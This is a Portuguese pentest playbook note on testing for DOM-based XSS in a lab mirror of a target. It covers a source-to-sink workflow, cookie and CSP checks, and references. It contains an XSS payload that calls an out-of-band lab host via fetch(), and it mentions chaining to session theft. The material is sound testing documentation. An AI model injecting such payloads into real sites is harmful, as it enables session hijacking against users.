---
id: "0533"
categoria: "06-client"
familia: "client-xss"
slug: "dom"
angulo: "lab"
mitre: "T1189"
owasp: "WSTG-INPV-01"
tags: ["06-client", "client-xss", "lab", "t1189"]
aliases: ["DOM XSS", "dom", "dom-lab"]
---

# DOM XSS — lab

Critério: outro analista fecha sozinho com esta nota.

## Contexto

XSS moderno raramente é `alert(1)`: o valor está em roubo de sessão, bypass de CSRF,
abuso de WebMessages e chain com CSP bypass. DOM XSS exige data flow (source→sink) real.

## Variante

- **location.hash → sink.** Sem isso o playbook da família mente.
- Sink + contexto + cookie flags. Encadeio até ação autenticada ou token se HttpOnly falhar.

## Setup

Espelho do alvo. Sem WAF/EDR às vezes — anoto o delta.

## Fluxo

1. Mapeio reflections e sinks DOM (innerHTML, location, postMessage).
2. Testo contextos (HTML, attr, JS, URL, CSS).
3. Avalio cookies HttpOnly e CSP.
4. Construir PoC de impacto (sessão de teste / ação).
5. Verifico mutação por sanitizers (DOMPurify misconfig).

## Exemplo

```html
<!-- reflected/stored lab payload — sem persistir em prod -->
<img src=x onerror="fetch('https://oast.lab.local/38e4c7')">
<!-- sink dom: sessão USER_A / cookie flags -->
```

## Pitfall

Não capture sessões de usuários reais. Evito defacement.

XSS/CSRF: preciso do sink e da condição de auth. alert(1) sem abuso de sessão é demo.

## Prova do lab

PoC HTML; cookie flags; impacto narrado.

## Refs

- [MITRE ATT&CK T1189](https://attack.mitre.org/techniques/T1189/)
- [MITRE ATT&CK T1059.007](https://attack.mitre.org/techniques/T1059/007/)
- [WSTG-INPV-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Relacionadas

- [DOM XSS](0153-client-xss-dom.md)
- [DOM XSS — hardening](0913-client-xss-dom--hardening.md)
- [template injection client (Angular/Vue)](0158-client-xss-angular.md)
- [XSS até account takeover](0160-client-xss-ato-chain.md)
- [CSP bypass gadgets](0155-client-xss-csp-bypass.md)
- [mutation XSS (mXSS)](0156-client-xss-mutation.md)